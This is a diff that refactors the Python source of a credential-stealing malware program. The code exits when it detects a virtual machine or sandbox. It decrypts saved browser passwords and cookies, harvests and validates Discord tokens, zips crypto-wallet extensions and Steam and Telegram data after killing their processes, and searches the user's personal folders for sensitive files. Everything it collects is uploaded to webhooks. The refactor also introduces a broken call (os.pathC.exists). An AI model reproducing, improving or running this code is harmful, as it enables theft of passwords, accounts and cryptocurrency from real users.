@@ -33,8 +33,12 @@ def in_virtualenv():
 class Kerpy:
     def registry_check(self):
         cmd = "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\"
-        reg1 = subprocess.run(cmd + "DriverDesc", shell=True, stderr=subprocess.DEVNULL)
-        reg2 = subprocess.run(cmd + "ProviderName", shell=True, stderr=subprocess.DEVNULL)
+        reg1 = subprocess.run(
+            f"{cmd}DriverDesc", shell=True, stderr=subprocess.DEVNULL
+        )
+        reg2 = subprocess.run(
+            f"{cmd}ProviderName", shell=True, stderr=subprocess.DEVNULL
+        )
         if reg1.returncode == 0 and reg2.returncode == 0:
             print("VMware Registry Detected")
             sys.exit()
@@ -42,32 +46,32 @@ class Kerpy:
     def processes_and_files_check(self):
         vmware_dll = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
         virtualbox_dll = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")    
-    
-        process = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
-        processList = []
-        for processNames in process.split(" "):
-            if ".exe" in processNames:
-                processList.append(processNames.replace("K\n", "").replace("\n", ""))
 
+        process = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
+        processList = [
+            processNames.replace("K\n", "").replace("\n", "")
+            for processNames in process.split(" ")
+            if ".exe" in processNames
+        ]
         if "VMwareService.exe" in processList or "VMwareTray.exe" in processList:
             print("VMwareService.exe & VMwareTray.exe process are running")
             sys.exit()
-                           
+
         if os.path.exists(vmware_dll): 
             print("Vmware DLL Detected")
             sys.exit()
-            
+
         if os.path.exists(virtualbox_dll):
             print("VirtualBox DLL Detected")
             sys.exit()
-        
+
         try:
             sandboxie = ctypes.cdll.LoadLibrary("SbieDll.dll")
             print("Sandboxie DLL Detected")
             sys.exit()
         except:
             pass        
-        
+
         processl = requests.get("https://raw.githubusercontent.com/blxstealer/lists/main/process.txt").text
         if processl in processList:
             sys.exit()
@@ -185,7 +189,7 @@ def CryptUnprotectData(encrypted_bytes, entropy=b''):
 
 def D3CrYP7V41U3(buff, master_key=None):
     starts = buff.decode(encoding='utf8', errors='ignore')[:3]
-    if starts == 'v10' or starts == 'v11':
+    if starts in ['v10', 'v11']:
         iv = buff[3:15]
         payload = buff[15:]
         cipher = AES.new(master_key, AES.MODE_GCM, iv)
@@ -194,7 +198,7 @@ def D3CrYP7V41U3(buff, master_key=None):
         return decrypted_pass
 
 def L04Dr3QU3575(methode, url, data='', files='', headers=''):
-    for i in range(8): # max trys
+    for _ in range(8):
         try:
             if methode == 'POST':
                 if data != '':
@@ -203,20 +207,19 @@ def L04Dr3QU3575(methode, url, data='', files='', headers=''):
                         return r
                 elif files != '':
                     r = requests.post(url, files=files)
-                    if r.status_code == 200 or r.status_code == 413: # 413 = DATA TO BIG
+                    if r.status_code in {200, 413}: # 413 = DATA TO BIG
                         return r
         except:
             pass
 
 def L04DUr118(h00k, data='', files='', headers=''):
-    for i in range(8):
+    for _ in range(8):
         try:
-            if headers != '':
-                r = urlopen(Request(h00k, data=data, headers=headers))
-                return r
-            else:
-                r = urlopen(Request(h00k, data=data))
-                return r
+            return (
+                urlopen(Request(h00k, data=data, headers=headers))
+                if headers != ''
+                else urlopen(Request(h00k, data=data))
+            )
         except: 
             pass
 
@@ -229,9 +232,7 @@ def g108411NF0():
     # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
     contry = ipdata["country_name"]
     contryCode = ipdata["country_code"].lower()
-    g108411NF0 = f":flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`"
-    # print(globalinfo)
-    return g108411NF0
+    return f":flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`"
 
 
 def TrU57(C00K13s):
@@ -240,12 +241,8 @@ def TrU57(C00K13s):
     data = str(C00K13s)
     tim = re.findall(".google.com", data)
     # print(len(tim))
-    if len(tim) < -1:
-        DETECTED = True
-        return DETECTED
-    else:
-        DETECTED = False
-        return DETECTED
+    DETECTED = len(tim) < -1
+    return DETECTED
         
 def inj3c710n():
 
@@ -307,7 +304,7 @@ def G37UHQFr13ND5(token):
         flags = friend['user']['public_flags']
         for badge in badgeList:
             if flags // badge["Value"] != 0 and friend['type'] == 1:
-                if not "House" in badge["Name"]:
+                if "House" not in badge["Name"]:
                     OwnedBadges += badge["Emoji"]
                 flags = flags % badge["Value"]
         if OwnedBadges != '':
@@ -378,16 +375,13 @@ def G3770K3N1NF0(token):
     pfp = userjson["avatar"]
     flags = userjson["public_flags"]
     nitro = ""
-    phone = "-"
-
     if "premium_type" in userjson: 
         nitrot = userjson["premium_type"]
         if nitrot == 1:
             nitro = "<a:subscriber:1095725882250895481> "
         elif nitrot == 2:
             nitro = "<a:boost:1095740247540776991> <a:subscriber:1095725882250895481> "
-    if "phone" in userjson: phone = f'`{userjson["phone"]}`'
-
+    phone = f'`{userjson["phone"]}`' if "phone" in userjson else "-"
     return username, hashtag, email, idd, pfp, flags, nitro, phone
 
 def CH3CK70K3N(token):
@@ -427,7 +421,7 @@ def UP104D70K3N(token, path):
     }
     username, hashtag, email, idd, pfp, flags, nitro, phone = G3770K3N1NF0(token)
 
-    if pfp == None: 
+    if pfp is None: 
         pfp = "https://cdn.discordapp.com/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png"
     else:
         pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
@@ -515,10 +509,10 @@ def UP104D(name, link):
     }
 
     if name == "lxcook":
-        rb = ' | '.join(da for da in c00K1W0rDs)
+        rb = ' | '.join(c00K1W0rDs)
         if len(rb) > 1000: 
             rrrrr = R3F0rM47(str(c00K1W0rDs))
-            rb = ' | '.join(da for da in rrrrr)
+            rb = ' | '.join(rrrrr)
         data = {
             "content": g108411NF0(),
             "embeds": [
@@ -540,10 +534,10 @@ def UP104D(name, link):
         return
 
     if name == "lxpassw":
-        ra = ' | '.join(da for da in p45WW0rDs)
+        ra = ' | '.join(p45WW0rDs)
         if len(ra) > 1000: 
             rrr = R3F0rM47(str(p45WW0rDs))
-            ra = ' | '.join(da for da in rrr)
+            ra = ' | '.join(rrr)
 
         data = {
             "content": g108411NF0(),
@@ -607,13 +601,13 @@ def g3770K3N(path, arg):
 
     path += arg
     for file in os.listdir(path):
-        if file.endswith(".log") or file.endswith(".ldb")   :
+        if file.endswith(".log") or file.endswith(".ldb"):
             for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                 for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                     for token in re.findall(regex, line):
                         global T0K3Ns
                         if CH3CK70K3N(token):
-                            if not token in T0K3Ns:
+                            if token not in T0K3Ns:
                                 # print(token)
                                 T0K3Ns += token
                                 UP104D70K3N(token, path)
@@ -626,7 +620,11 @@ def g37P455W(path, arg):
     pathC = path + arg + "/Login Data"
     if os.stat(pathC).st_size == 0: return
 
-    tempfold = temp + "cs" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+    tempfold = (
+        f"{temp}cs"
+        + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8))
+        + ".db"
+    )
 
     shutil.copy2(pathC, tempfold)
     conn = sql_connect(tempfold)
@@ -637,7 +635,7 @@ def g37P455W(path, arg):
     conn.close()
     os.remove(tempfold)
 
-    pathKey = path + "/Local State"
+    pathKey = f"{path}/Local State"
     with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
     master_key = b64decode(local_state['os_crypt']['encrypted_key'])
     master_key = CryptUnprotectData(master_key[5:])
@@ -650,7 +648,7 @@ def g37P455W(path, arg):
                     tmp = wa
                     wa = tmp.split('[')[1].split(']')[0]
                 if wa in row[0]:
-                    if not old in p45WW0rDs: p45WW0rDs.append(old)
+                    if old not in p45WW0rDs: p45WW0rDs.append(old)
             P455w.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {D3CrYP7V41U3(row[2], master_key)}")
             P455WC0UNt += 1
     wr173F0rF113(P455w, 'passw')
@@ -659,12 +657,16 @@ C00K13s = []
 def g37C00K13(path, arg):
     global C00K13s, C00K1C0UNt
     if not os.path.exists(path): return
-    
+
     pathC = path + arg + "/Cookies"
     if os.stat(pathC).st_size == 0: return
-    
-    tempfold = temp + "cs" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
-    
+
+    tempfold = (
+        f"{temp}cs"
+        + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8))
+        + ".db"
+    )
+
     shutil.copy2(pathC, tempfold)
     conn = sql_connect(tempfold)
     cursor = conn.cursor()
@@ -674,8 +676,8 @@ def g37C00K13(path, arg):
     conn.close()
     os.remove(tempfold)
 
-    pathKey = path + "/Local State"
-    
+    pathKey = f"{path}/Local State"
+
     with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
     master_key = b64decode(local_state['os_crypt']['encrypted_key'])
     master_key = CryptUnprotectData(master_key[5:])
@@ -688,7 +690,7 @@ def g37C00K13(path, arg):
                     tmp = wa
                     wa = tmp.split('[')[1].split(']')[0]
                 if wa in row[0]:
-                    if not old in c00K1W0rDs: c00K1W0rDs.append(old)
+                    if old not in c00K1W0rDs: c00K1W0rDs.append(old)
             C00K13s.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{D3CrYP7V41U3(row[2], master_key)}")
             C00K1C0UNt += 1
     wr173F0rF113(C00K13s, 'cook')
@@ -698,21 +700,21 @@ def G37D15C0rD(path, arg):
 
     pathC = path + arg
 
-    pathKey = path + "/Local State"
+    pathKey = f"{path}/Local State"
     with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
     master_key = b64decode(local_state['os_crypt']['encrypted_key'])
     master_key = CryptUnprotectData(master_key[5:])
     # print(path, master_key)
-    
+
     for file in os.listdir(pathC):
         # print(path, file)
-        if file.endswith(".log") or file.endswith(".ldb")   :
+        if file.endswith(".log") or file.endswith(".ldb"):
             for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines()if x.strip()]:
                 for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                     global T0K3Ns
                     tokenDecoded = D3CrYP7V41U3(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                     if CH3CK70K3N(tokenDecoded):
-                        if not tokenDecoded in T0K3Ns:
+                        if tokenDecoded not in T0K3Ns:
                             # print(token)
                             T0K3Ns += tokenDecoded
                             # writeforfile(Tokens, 'tokens')
@@ -729,7 +731,7 @@ def G47H3rZ1P5(paths1, paths2, paths3):
         a = threading.Thread(target=Z1P7H1N65, args=[patt[0], patt[2], patt[1]])
         a.start()
         thttht.append(a)
-    
+
     a = threading.Thread(target=Z1P73136r4M, args=[paths3[0], paths3[2], paths3[1]])
     a.start()
     thttht.append(a)
@@ -737,21 +739,18 @@ def G47H3rZ1P5(paths1, paths2, paths3):
     for thread in thttht: 
         thread.join()
     global W411375Z1p, G4M1N6Z1p, O7H3rZ1p
-        # print(WalletsZip, G4M1N6Z1p, OtherZip)
-
     wal, ga, ot = "",'',''
-    if not len(W411375Z1p) == 0:
+    if len(W411375Z1p) != 0:
         wal = "<:ETH:975438262053257236> •  Wallets\n"
         for i in W411375Z1p:
             wal += f"└─ [{i[0]}]({i[1]})\n"
-    if not len(W411375Z1p) == 0:
         ga = "<:blackgengar:1111366900690202624>  •  Gaming\n"
         for i in G4M1N6Z1p:
             ga += f"└─ [{i[0]}]({i[1]})\n"
-    if not len(O7H3rZ1p) == 0:
+    if len(O7H3rZ1p) != 0:
         ot = "<:black_planet:1095740276850569226>  •  Apps\n"
         for i in O7H3rZ1p:
-            ot += f"└─ [{i[0]}]({i[1]})\n"          
+            ot += f"└─ [{i[0]}]({i[1]})\n"
     headers = {
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
@@ -781,13 +780,18 @@ def Z1P73136r4M(path, arg, procc):
     global O7H3rZ1p
     pathC = path
     name = arg
-    if not os.path.exists(pathC): return
+    if not os.pathC.exists(pathC): return
     subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
 
     zf = ZipFile(f"{pathC}/{name}.zip", "w")
     for file in os.listdir(pathC):
-        if not ".zip" in file and not "tdummy" in file and not "user_data" in file and not "webview" in file: 
-            zf.write(pathC + "/" + file)
+        if (
+            ".zip" not in file
+            and "tdummy" not in file
+            and "user_data" not in file
+            and "webview" not in file
+        ): 
+            zf.write(f"{pathC}/{file}")
     zf.close()
 
     lnik = uP104D7060F113(f'{pathC}/{name}.zip')
@@ -807,7 +811,7 @@ def Z1P7H1N65(path, arg, procc):
 
     if "ejbalbakoplchlghecdalmeeeajnimhm" in arg:
         browser = path.split("\\")[4].split("/")[1].replace(' ', '')
-        name = f"Metamask_Edge"
+        name = "Metamask_Edge"
         pathC = path + arg
 
     if "fhbohimaelbohpjbbldcngcnapndodjp" in arg:
@@ -829,7 +833,7 @@ def Z1P7H1N65(path, arg, procc):
         browser = path.split("\\")[4].split("/")[1].replace(' ', '')
         name = f"Phantom_{browser}"
         pathC = path + arg
-    
+
     if not os.path.exists(pathC): return
     subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
 
@@ -841,18 +845,15 @@ def Z1P7H1N65(path, arg, procc):
         if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
         f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
         data = f.readlines()
-        # print(data)
-        found = False
-        for l in data:
-            if 'RememberPassword"\t\t"1"' in l:
-                found = True
-        if found == False: return
+        found = any('RememberPassword"\t\t"1"' in l for l in data)
+        if not found: return
         name = arg
 
 
     zf = ZipFile(f"{pathC}/{name}.zip", "w")
     for file in os.listdir(pathC):
-        if not ".zip" in file: zf.write(pathC + "/" + file)
+        if ".zip" not in file:
+            zf.write(f"{pathC}/{file}")
     zf.close()
 
     lnik = uP104D7060F113(f'{pathC}/{name}.zip')
@@ -955,14 +956,13 @@ def K1W1F01D3r(pathF, keywords):
     listOfFile = os.listdir(pathF)
     ffound = []
     for file in listOfFile:
-        if not os.path.isfile(pathF + "/" + file): return
+        if not os.path.isfile(f"{pathF}/{file}"): return
         i += 1
-        if i <= maxfilesperdir:
-            url = uP104D7060F113(pathF + "/" + file)
-            ffound.append([pathF + "/" + file, url])
-        else:
+        if i > maxfilesperdir:
             break
-    K1W1F113s.append(["folder", pathF + "/", ffound])
+        url = uP104D7060F113(f"{pathF}/{file}")
+        ffound.append([f"{pathF}/{file}", url])
+    K1W1F113s.append(["folder", f"{pathF}/", ffound])
 
 K1W1F113s = []
 def K1W1F113(path, keywords):
@@ -972,11 +972,11 @@ def K1W1F113(path, keywords):
     for file in listOfFile:
         for worf in keywords:
             if worf in file.lower():
-                if os.path.isfile(path + "/" + file) and ".txt" in file:
-                    fifound.append([path + "/" + file, uP104D7060F113(path + "/" + file)])
+                if os.path.isfile(f"{path}/{file}") and ".txt" in file:
+                    fifound.append([f"{path}/{file}", uP104D7060F113(f"{path}/{file}")])
                     break
-                if os.path.isdir(path + "/" + file):
-                    target = path + "/" + file
+                if os.path.isdir(f"{path}/{file}"):
+                    target = f"{path}/{file}"
                     K1W1F01D3r(target, keywords)
                     break
 
@@ -984,11 +984,7 @@ def K1W1F113(path, keywords):
 
 def K1W1():
     user = temp.split("\AppData")[0]
-    path2search = [
-        user + "/Desktop",
-        user + "/Downloads",
-        user + "/Documents"
-    ]
+    path2search = [f"{user}/Desktop", f"{user}/Downloads", f"{user}/Documents"]
 
     key_wordsFolder = [
         "account",
